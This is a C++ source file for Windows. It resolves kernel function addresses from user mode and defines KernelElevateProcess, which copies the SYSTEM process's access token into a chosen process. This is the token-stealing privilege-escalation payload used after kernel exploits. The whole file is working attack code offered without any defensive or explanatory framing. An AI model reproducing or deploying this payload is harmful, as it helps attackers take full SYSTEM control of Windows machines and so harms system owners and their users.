#include <iostream>
#include <Windows.h>
#include <WinIoCtl.h>
#include <ntstatus.h>

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemBasicInformation = 0,
	SystemProcessorInformation = 1,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemPathInformation = 4,
	SystemProcessInformation = 5,
	SystemCallCountInformation = 6,
	SystemDeviceInformation = 7,
	SystemProcessorPerformanceInformation = 8,
	SystemFlagsInformation = 9,
	SystemCallTimeInformation = 10,
	SystemModuleInformation = 11,
	SystemLocksInformation = 12,
	SystemStackTraceInformation = 13,
	SystemPagedPoolInformation = 14,
	SystemNonPagedPoolInformation = 15,
	SystemHandleInformation = 16,
	SystemObjectInformation = 17,
	SystemPageFileInformation = 18,
	SystemVdmInstemulInformation = 19,
	SystemVdmBopInformation = 20,
	SystemFileCacheInformation = 21,
	SystemPoolTagInformation = 22,
	SystemInterruptInformation = 23,
	SystemDpcBehaviorInformation = 24,
	SystemFullMemoryInformation = 25,
	SystemLoadGdiDriverInformation = 26,
	SystemUnloadGdiDriverInformation = 27,
	SystemTimeAdjustmentInformation = 28,
	SystemSummaryMemoryInformation = 29,
	SystemMirrorMemoryInformation = 30,
	SystemPerformanceTraceInformation = 31,
	SystemObsolete0 = 32,
	SystemExceptionInformation = 33,
	SystemCrashDumpStateInformation = 34,
	SystemKernelDebuggerInformation = 35,
	SystemContextSwitchInformation = 36,
	SystemRegistryQuotaInformation = 37,
	SystemExtendServiceTableInformation = 38,
	SystemPrioritySeperation = 39,
	SystemVerifierAddDriverInformation = 40,
	SystemVerifierRemoveDriverInformation = 41,
	SystemProcessorIdleInformation = 42,
	SystemLegacyDriverInformation = 43,
	SystemCurrentTimeZoneInformation = 44,
	SystemLookasideInformation = 45,
	SystemTimeSlipNotification = 46,
	SystemSessionCreate = 47,
	SystemSessionDetach = 48,
	SystemSessionInformation = 49,
	SystemRangeStartInformation = 50,
	SystemVerifierInformation = 51,
	SystemVerifierThunkExtend = 52,
	SystemSessionProcessInformation = 53,
	SystemLoadGdiDriverInSystemSpace = 54,
	SystemNumaProcessorMap = 55,
	SystemPrefetcherInformation = 56,
	SystemExtendedProcessInformation = 57,
	SystemRecommendedSharedDataAlignment = 58,
	SystemComPlusPackage = 59,
	SystemNumaAvailableMemory = 60,
	SystemProcessorPowerInformation = 61,
	SystemEmulationBasicInformation = 62,
	SystemEmulationProcessorInformation = 63,
	SystemExtendedHandleInformation = 64,
	SystemLostDelayedWriteInformation = 65,
	SystemBigPoolInformation = 66,
	SystemSessionPoolTagInformation = 67,
	SystemSessionMappedViewInformation = 68,
	SystemHotpatchInformation = 69,
	SystemObjectSecurityMode = 70,
	SystemWatchdogTimerHandler = 71,
	SystemWatchdogTimerInformation = 72,
	SystemLogicalProcessorInformation = 73,
	SystemWow64SharedInformationObsolete = 74,
	SystemRegisterFirmwareTableInformationHandler = 75,
	SystemFirmwareTableInformation = 76,
	SystemModuleInformationEx = 77,
	SystemVerifierTriageInformation = 78,
	SystemSuperfetchInformation = 79,
	SystemMemoryListInformation = 80,
	SystemFileCacheInformationEx = 81,
	SystemThreadPriorityClientIdInformation = 82,
	SystemProcessorIdleCycleTimeInformation = 83,
	SystemVerifierCancellationInformation = 84,
	SystemProcessorPowerInformationEx = 85,
	SystemRefTraceInformation = 86,
	SystemSpecialPoolInformation = 87,
	SystemProcessIdInformation = 88,
	SystemErrorPortInformation = 89,
	SystemBootEnvironmentInformation = 90,
	SystemHypervisorInformation = 91,
	SystemVerifierInformationEx = 92,
	SystemTimeZoneInformation = 93,
	SystemImageFileExecutionOptionsInformation = 94,
	SystemCoverageInformation = 95,
	SystemPrefetchPatchInformation = 96,
	SystemVerifierFaultsInformation = 97,
	SystemSystemPartitionInformation = 98,
	SystemSystemDiskInformation = 99,
	SystemProcessorPerformanceDistribution = 100,
	SystemNumaProximityNodeInformation = 101,
	SystemDynamicTimeZoneInformation = 102,
	SystemCodeIntegrityInformation = 103,
	SystemProcessorMicrocodeUpdateInformation = 104,
	SystemProcessorBrandString = 105,
	SystemVirtualAddressInformation = 106,
	SystemLogicalProcessorAndGroupInformation = 107,
	SystemProcessorCycleTimeInformation = 108,
	SystemStoreInformation = 109,
	SystemRegistryAppendString = 110,
	SystemAitSamplingValue = 111,
	SystemVhdBootInformation = 112,
	SystemCpuQuotaInformation = 113,
	SystemNativeBasicInformation = 114,
	SystemErrorPortTimeouts = 115,
	SystemLowPriorityIoInformation = 116,
	SystemBootEntropyInformation = 117,
	SystemVerifierCountersInformation = 118,
	SystemPagedPoolInformationEx = 119,
	SystemSystemPtesInformationEx = 120,
	SystemNodeDistanceInformation = 121,
	SystemAcpiAuditInformation = 122,
	SystemBasicPerformanceInformation = 123,
	SystemQueryPerformanceCounterInformation = 124,
	SystemSessionBigPoolInformation = 125,
	SystemBootGraphicsInformation = 126,
	SystemScrubPhysicalMemoryInformation = 127,
	SystemBadPageInformation = 128,
	SystemProcessorProfileControlArea = 129,
	SystemCombinePhysicalMemoryInformation = 130,
	SystemEntropyInterruptTimingInformation = 131,
	SystemConsoleInformation = 132,
	SystemPlatformBinaryInformation = 133,
	SystemPolicyInformation = 134,
	SystemHypervisorProcessorCountInformation = 135,
	SystemDeviceDataInformation = 136,
	SystemDeviceDataEnumerationInformation = 137,
	SystemMemoryTopologyInformation = 138,
	SystemMemoryChannelInformation = 139,
	SystemBootLogoInformation = 140,
	SystemProcessorPerformanceInformationEx = 141,
	SystemSpare0 = 142,
	SystemSecureBootPolicyInformation = 143,
	SystemPageFileInformationEx = 144,
	SystemSecureBootInformation = 145,
	SystemEntropyInterruptTimingRawInformation = 146,
	SystemPortableWorkspaceEfiLauncherInformation = 147,
	SystemFullProcessInformation = 148,
	SystemKernelDebuggerInformationEx = 149,
	SystemBootMetadataInformation = 150,
	SystemSoftRebootInformation = 151,
	SystemElamCertificateInformation = 152,
	SystemOfflineDumpConfigInformation = 153,
	SystemProcessorFeaturesInformation = 154,
	SystemRegistryReconciliationInformation = 155,
	SystemEdidInformation = 156,
	MaxSystemInfoClass = 157
} SYSTEM_INFORMATION_CLASS;

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID  MappedBase;
	PVOID  ImageBase;
	ULONG  ImageSize;
	ULONG  Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR  FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG                          NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

typedef struct
{
	ULONG Reserved1;
	ULONG Reserved2;
	PVOID ImageBaseAddress;
	ULONG ImageSize;
	ULONG Flags;
	WORD  Id;
	WORD  Rank;
	WORD  w018;
	WORD  NameOffset;
	BYTE  Name[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct
{
	ULONG         ModulesCount;
	SYSTEM_MODULE Modules[0];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	ULONG                   BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
} SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;

typedef NTSTATUS(NTAPI* _PsLookupProcessByProcessId)(
	HANDLE                  ProcessId,
	PVOID                   Process // SYSTEM_PROCESS_INFO
);
typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
);
typedef PACCESS_TOKEN(NTAPI* _PsReferencePrimaryToken)(
	PVOID Process // PEPROCESS
);

_NtQuerySystemInformation NtQuerySystemInformation = NULL;
_PsLookupProcessByProcessId PsLookupProcessByProcessId = NULL;
_PsReferencePrimaryToken PsReferencePrimaryToken = NULL;

void* GetKernelFunction(HMODULE kernel, void* kernelBase, const char* name)
{
	return PVOID((uint64_t)kernelBase + (uint64_t)GetProcAddress(kernel, name) - (uint64_t)kernel);
}

void ReplaceMember(PDWORD_PTR pStruct, DWORD_PTR currentValue, DWORD_PTR newValue)
{
	DWORD_PTR mask = ~(sizeof(DWORD_PTR) == sizeof(DWORD) ? 7 : 0xf);

	DWORD_PTR i = 0;
	while(true)
	{
		if (((pStruct[i] ^ currentValue) & mask) == 0)
		{
			pStruct[i] = newValue;
			break;
		}
		i++;
	}
}

bool InitializeKernel()
{
	NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	DWORD len;
	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (modules)
	{
		NtQuerySystemInformation(SystemModuleInformation, modules, len, &len);

		void* kernelBase = modules->Modules[0].ImageBase;
		const char* kernelImage = (const char*)modules->Modules[0].FullPathName;
		const char* kernelName = (const char*)modules->Modules[0].FullPathName + modules->Modules[0].OffsetToFileName;

		HMODULE kernel = LoadLibraryExA(kernelName, NULL, DONT_RESOLVE_DLL_REFERENCES);

		if (kernel)
		{
			PsLookupProcessByProcessId = (_PsLookupProcessByProcessId)GetKernelFunction(kernel, kernelBase, "PsLookupProcessByProcessId");
			PsReferencePrimaryToken = (_PsReferencePrimaryToken)GetKernelFunction(kernel, kernelBase, "PsReferencePrimaryToken");

#ifdef KERNEL_DEBUG
			std::cout << "KernelBase: 0x" << std::hex << kernelBase << std::endl;
			std::cout << "KernelImage: " << kernelImage << std::endl;
			std::cout << "KernelName: " << kernelName << std::endl;
			std::cout << "NtQuerySystemInformation: 0x" << std::hex << NtQuerySystemInformation << std::endl;
			std::cout << "PsLookupProcessByProcessId: 0x" << std::hex << PsLookupProcessByProcessId << std::endl;
			std::cout << "PsReferencePrimaryToken: 0x" << std::hex << PsReferencePrimaryToken << std::endl;
#endif
			FreeLibrary(kernel);

			return true;
		}
		else
		{
#ifdef KERNEL_DEBUG
			std::cout << "Error loading kernel" << std::endl;
#endif
		}

		VirtualFree(modules, NULL, MEM_RELEASE);
	}
	else
	{
#ifdef KERNEL_DEBUG
		std::cout << "Error loading modules" << std::endl;
#endif
	}

	return false;
}

bool KernelElevateProcess(int processId)
{
	PVOID systemProcessInfo;
	PVOID currentProcessInfo;
	PsLookupProcessByProcessId((HANDLE)4, &systemProcessInfo);
	PsLookupProcessByProcessId((HANDLE)processId, &currentProcessInfo);
	PACCESS_TOKEN currentToken = PsReferencePrimaryToken(currentProcessInfo);
	PACCESS_TOKEN systemToken = PsReferencePrimaryToken(systemProcessInfo);
	ReplaceMember((PDWORD_PTR)currentProcessInfo, (DWORD_PTR)currentToken, (DWORD_PTR)systemToken);
	return true;
}
